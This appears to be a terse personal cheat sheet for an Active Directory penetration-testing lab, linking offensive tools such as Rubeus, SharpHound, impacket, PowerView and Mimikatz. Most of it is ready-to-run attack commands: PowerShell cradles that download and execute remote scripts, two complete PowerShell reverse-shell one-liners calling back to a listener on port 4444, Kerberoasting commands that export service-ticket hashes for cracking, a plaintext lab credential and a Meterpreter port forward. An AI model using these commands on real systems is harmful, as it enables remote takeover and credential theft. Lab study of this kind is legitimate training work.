# aaaxxqqq

https://www.thehacker.recipes/ad/movement/kerberos/asreproast

Rubeus ->  https://github.com/GhostPack/Rubeus


Metasploit
https://www.offsec.com/metasploit-unleashed/msfvenom/
https://www.beyondtrust.com/blog/entry/how-to-use-metasploit-for-command-control
https://github.com/lexisrepo/Shells
https://0xdf.gitlab.io/2022/07/16/htb-acute.html

iex ((New-Object Net.WebClient).DownloadString('http://10.10.14.244/ps.ps1'))
IEX([Net.Webclient]::new().DownloadString($url))
https://github.com/martinsohn/PowerShell-reverse-shell/blob/main/powershell-reverse-shell.ps1



$client = New-Object System.Net.Sockets.TCPClient('10.10.50.101',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
$sm=(New-Object Net.Sockets.TCPClient('10.10.50.101',4444)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}



sharphound
https://github.com/SpecterOps/SharpHound
bloodhound -> 


impacket
https://github.com/fortra/impacket

[
https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/master/Recon/PowerView.ps1)
shell
powershell.exe Invoke-WebRequest -Uri "http://10.10.15.253:8000/PowerView.ps1" -OutFile “C:\PowerView.ps1"

Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname
Get-DomainUser -Identity svc_sql -SPN | Get-DomainSPNTicket –Format Hashcat | Out-File .\svc_sql_tgs_hash.txt


username-passs
$username = "inlanefreight\svc_sql"
$password = "lucky7"
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ($username, $securePassword)


arp -a 
fping

portfwd add -l 7878 -p 445 -r 172.16.6.50

Mimikatz
https://github.com/ParrotSec/mimikatz/blob/master/x64/mimikatz.exe


runas /netonly /user:INLANEFREIGHT\tpetty powershell





